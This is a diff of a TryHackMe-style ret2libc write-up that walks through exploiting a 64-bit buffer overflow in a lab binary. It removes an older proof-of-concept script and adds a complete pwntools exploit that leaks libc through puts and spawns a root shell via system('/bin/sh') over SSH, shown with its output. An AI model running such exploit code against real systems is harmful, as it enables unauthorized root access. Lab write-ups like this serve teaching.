@@ -260,14 +260,12 @@ Segmentation fault (core dumped)
 <br>
 <br>
 
-
 ```bash
 gef➤ pattern create 200
 [+] Generating a pattern of 200 bytes (n=4)
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa...aabvaabwaabxaabyaab
 [+] Saved as '$_gef0'
 ```
-
 
 <img width="1339" height="798" alt="image" src="https://github.com/user-attachments/assets/cf7ec6c0-3ba7-4661-a564-45e28b4d7d74" />
 
@@ -296,7 +294,10 @@ gef➤ pattern search $rsp
 ```bash
 :~/ret2libc# file exploit_me
 exploit_me: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c771960dddc76d1e69e8f741185d232c7ee6098, not stripped
-root@ip-10-65-100-222:~/ret2libc# checksec exploit_me
+```
+
+```bash
+:~/ret2libc# checksec exploit_me
 [*] Checking for new versions of pwntools
     To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to 'never' (old way).
     Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
@@ -389,7 +390,6 @@ andy@...:~$ cat /proc/sys/kernel/randomize_va_space
 Before transferring the binary, make sure that your machine uses the same libc as the attached VM; otherwise, you could encounter some problems (you can use <code>ldd exploit_me</code> to do that). If you still have problems, I recommend using Kali Linux or the THM AttackBox to review the binary in ghidra.<br>
 
 Let's start by transferring the exploit_me binary to your machine. We can do that with a python3 server.<br> 
-
 
 In the attached VM run command:<br> 
 
@@ -524,8 +524,6 @@ payload += p64(elf.plt.puts)
 payload += p64(elf.symbols.main)
 ```
 
-
-
 <h3>Part 4</h3>
 <p><em>Sending and processing</em></p>
 
@@ -570,8 +568,6 @@ p.interactive()
 
 And that's about it. Go write the exploit yourself if you weren't following along step by step. And if you've done everything well, you should have root privileges, so go grab the flag!</p>
 
-<p>7.1. <em>What is the flag?</em><br>
-<code>_______________________</code></p>
 
 ```bash
 :~# nmap -sC -sV -Pn -n -T4 -p- xx.xx.xxx.xx
@@ -634,139 +630,6 @@ tcp              LISTEN            0                 128                        
 :~/ret2libc# scp andy@...:/lib/x86_64-linux-gnu/libc.so.6 .
 andy@...'s password: 
 libc.so.6                                                                                                                               100% 1982KB  84.4MB/s   00:00    
-```
-
-```bash
-:~/ret2libc# cat poc.py
-
-#!/usr/bin/env python3
-from pwn import *
-
-context.binary = binary =  './exploit_me'
-
-elf = ELF(binary)
-rop = ROP(elf)
-PUTS_PLT = 0x4004a0
-
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-ret_gadget = pop_rdi + 1
-
-try:
-    libc = ELF('./libc.so.6')
-except:
-    print("[-] lib.so.6 error")
-    exit()
-
-try:
-    s = ssh(user='andy', host='xx.xx.xxx.xx', password='ret2libc!')
-    p = s.process('/home/andy/exploit_me')
-except Exception as e:
-    print(f"[-] -------------------- Connection Error: {e}")
-    exit()
-
-print("\n[+] -------------------- Sending Payload 1 ... ")
-padding = b'A' * 18 
-payload = padding
-payload += p64(pop_rdi)
-payload += p64(elf.got.gets)
-payload += p64(PUTS_PLT)
-payload += p64(elf.symbols.main)
-
-p.recvline(b'Type your name:')
-p.clean()
-
-p.sendline(payload)
-p.recvline()
-
-leak_raw = p.recvline().strip()
-
-leak = u64(leak_raw.ljust(8, b'\0'))
-log.success(f'Gets leak => {hex(leak)}')
-libc.address = leak - libc.symbols.gets
-log.success(f"Libc Base: {hex(libc.address)}")
-
-print("\n[+] -------------------- Sending Payload 2 ... ")
-payload = padding
-payload += p64(pop_rdi)
-payload += p64(next(libc.search(b'/bin/sh')))
-payload += p64(libc.symbols.system)
-
-p.clean()
-p.sendline(payload)
-p.recvline()
-print("[*] Trying ...")
-p.sendline(b'cat flag.txt; ls; id')
-time.sleep(1)
-
-try:
-    print(p.recvall(timeout=2).decode(errors='ignore'))
-except:
-    pass
-
-print("[*] Starting interactive mode...")
-p.interactive()
-```
-
-```bash
-:~/ret2libc# python3 poc.py
-[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
-[*] '/root/ret2libc/exploit_me'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      No canary found
-    NX:         NX enabled
-    PIE:        No PIE (0x400000)
-    Stripped:   No
-[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
-[*] Loaded 14 cached gadgets for './exploit_me'
-[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
-[*] '/root/ret2libc/libc.so.6'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        PIE enabled
-    SHSTK:      Enabled
-    IBT:        Enabled
-/usr/lib/python3/dist-packages/paramiko/transport.py:220: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed in a future release
-  "class": algorithms.Blowfish,
-[+] Connecting to ... on port 22: Done
-[*] andy@xx.xx.xxx.xx:
-    Distro    Ubuntu 20.04
-    OS:       linux
-    Arch:     amd64
-    Version:  5.15.0
-    ASLR:     Enabled
-    SHSTK:    Disabled
-    IBT:      Disabled
-[+] Starting remote process None on ...: pid 6111
-[!] ASLR is disabled for '/home/andy/exploit_me'!
-
-[+] -------------------- Sending Payload 1 ... 
-[+] Gets leak => 0x7fa3e8166970
-[+] Libc Base: 0x7fa3e80e3000
-
-[+] -------------------- Sending Payload 2 ... 
-[*] Trying ...
-[+] Receiving all data: Done (0B)
-[*] Stopped remote process 'exploit_me' on...5 (pid 6111)
-
-[*] Starting interactive mode...
-[*] Switching to interactive mode
-[*] Got EOF while reading in interactive
-```
-
-
-```bash
-andy@...:~$ pwd
-/home/andy
-```
-
-
-
-```bash
-[+] Gets leak => 0x7fa3e8166970
-[+] Libc Base: 0x7fa3e80e3000
 ```
 
 ```bash
@@ -1387,40 +1250,170 @@ gef➤  find 0x00007f6beef7b000, 0x00007f6bef0f3000, (char)0x5f, (char)0xc3
 ```
 
 
+______________
 
 
-  GNU nano 4.8                                                    exploit.py                                                     Modified  
-import struct
-import sys
+```bash
+:~/ret2libc# file exploit_me
+exploit_me: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c771960dddc76d1e69e8f741185d232c7ee6098, not stripped
+```
 
-# ------------------------------------------------------------
-# UPDATE THESE TWO VARIABLES
-# ------------------------------------------------------------
-system_addr =  0x7f6beefab290
-binsh_addr  = 0x7f7a2b4065bd 
+```bash
+:~/ret2libc# ls
+exploit_me  libc.so.6
+```
 
-# ------------------------------------------------------------
-# ALREADY FILLED FOR THIS SESSION
-# ------------------------------------------------------------
-gadget_addr = 0x7f6beef7cb6a    # <--- From your 'find' command
-offset      = 18                # Confirmed
+```bash
+:~/ret2libc# chmod 777 exploit_me
+```
 
-# ------------------------------------------------------------
-# PAYLOAD
-# ------------------------------------------------------------
-payload = b"A" * offset
-payload += struct.pack("<Q", gadget_addr) # Pop RDI
-payload += struct.pack("<Q", binsh_addr)  # Arg: "/bin/sh"
-payload += struct.pack("<Q", system_addr) # Call System
-sys.stdout.buffer.write(payload)
+```bash
+:~/ret2libc# ls -lah
+total 2.0M
+drwxr-xr-x  2 root root 4.0K Jan 22 17:38 .
+drwxr-xr-x 51 root root 4.0K Jan 22 17:18 ..
+-rwxrwxrwx  1 root root 8.2K Sep 12  2021 exploit_me
+-rw-r--r--  1 root root 2.0M May 26  2025 libc.so.6
+```
+
+```bash
+:~/ret2libc# nano exploit.py
+```
+
+```bash
+:~/ret2libc# ls
+exploit_me  exploit.py  libc.so.6
+```
+
+```bash
+#!/usr/bin/env python3
+from pwn import *
+
+# 1. Setup Context
+# Load local binary and libc to gather gadgets and offsets
+context.binary = binary = ELF('./exploit_me')
+libc = ELF('./libc.so.6')
+rop = ROP(binary)
+
+# 2. Connection Details
+# ===> IMPORTANT: REPLACE THIS IP WITH THE TARGET MACHINE IP <===
+host = '10.66.151.55' 
+user = 'andy'
+password = 'ret2libc!'
+
+# Connect via SSH and spawn the process on the REMOTE machine
+s = ssh(user=user, host=host, password=password)
+p = s.process('/home/andy/exploit_me')
+
+# 3. Gadgets & Constants
+offset = 18
+padding = b'A' * offset
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret_gadget = rop.find_gadget(['ret'])[0]  # Required for Stack Alignment
+
+# 4. Payload 1: Leak Libc Address
+log.info("Sending Payload 1 to leak 'gets' address...")
+payload1 = padding
+payload1 += p64(pop_rdi)
+payload1 += p64(binary.got['gets'])     # Argument: Address of 'gets' in GOT
+# payload1 += p64(binary.plt['puts'])     # Function: Call 'puts' to print it
+puts_plt = 0x4004a0
+payload1 += p64(puts_plt)
+payload1 += p64(binary.symbols['main']) # Return to main to keep process alive
+
+p.recvuntil(b'Type your name:')
+p.clean()
+p.sendline(payload1)
+
+# 5. Calculate Libc Base
+p.recvline() # Skip "Your name is..." prompt
+# Receive leaked bytes, strip newline, pad to 8 bytes
+leaked_bytes = p.recvline().strip().ljust(8, b'\x00')
+leak_addr = u64(leaked_bytes)
+log.success(f"Leaked gets address: {hex(leak_addr)}")
+
+# Calculate Base Address
+libc.address = leak_addr - libc.symbols['gets']
+log.success(f"Libc base address: {hex(libc.address)}")
+
+# 6. Payload 2: Get Shell
+log.info("Sending Payload 2 for Root Shell...")
+bin_sh = next(libc.search(b'/bin/sh'))
+system_addr = libc.symbols['system']
+
+payload2 = padding
+payload2 += p64(pop_rdi)
+payload2 += p64(bin_sh)      # Arg: Pointer to "/bin/sh"
+payload2 += p64(ret_gadget)  # <--- ALIGNMENT FIX (required for Ubuntu x64)
+payload2 += p64(system_addr) # Function: system()
+
+p.sendline(payload2)
+p.interactive()
+```
 
 
+```bash
+:~/ret2libc# python3 exploit.py
+[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
+[*] '/root/ret2libc/exploit_me'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
+[*] '/root/ret2libc/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[*] Loaded 14 cached gadgets for './exploit_me'
+/usr/lib/python3/dist-packages/paramiko/transport.py:220: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed in a future release
+  "class": algorithms.Blowfish,
+[+] Connecting to xx.xx.xxx.xx on port 22: Done
+[*] andy@10.66.151.55:
+    Distro    Ubuntu 20.04
+    OS:       linux
+    Arch:     amd64
+    Version:  5.15.0
+    ASLR:     Enabled
+    SHSTK:    Disabled
+    IBT:      Disabled
+[+] Starting remote process None on xx.xx.xxx.xx: pid 1471
+[!] ASLR is disabled for '/home/andy/exploit_me'!
+[*] Sending Payload 1 to leak 'gets' address...
+[+] Leaked gets address: 0x7fd047f17970
+[+] Libc base address: 0x7fd047e94000
+[*] Sending Payload 2 for Root Shell...
+[*] Switching to interactive mode
+Type your name: 
+Your name is: AAAAAAAAAAAAAAAAAA\x83\x06@
+# $ id
+uid=0(root) gid=1002(andy) groups=1002(andy)
+# $ pwd
+/home/andy
+# $ cd /root
+# $ ls
+root.txt  snap	source_code.c
+# $ cat root.txt
+thm{•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••}
+# $  
+```
 
 
-andy@ip-10-66-188-237:~$ python3 exploit.py > payload
+<img width="1149" height="759" alt="image" src="https://github.com/user-attachments/assets/6fe69ca2-cc05-45ee-bee9-4bcfefe8b80f" />
 
-<p>The <code>got.plt</code>c region is mapped between addresses 0x0000000000601000 and 0x0000000000601038</p>
+<br>
+<br>
+<br>
+<p><em>Answer the question below</em></p>
 
+<p>7.1. <em> What is the flag?</em><br>
+<code>thm{•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••}</code></p>
 
 <br>
 <h2>Task 8 . Conclusion</h2>
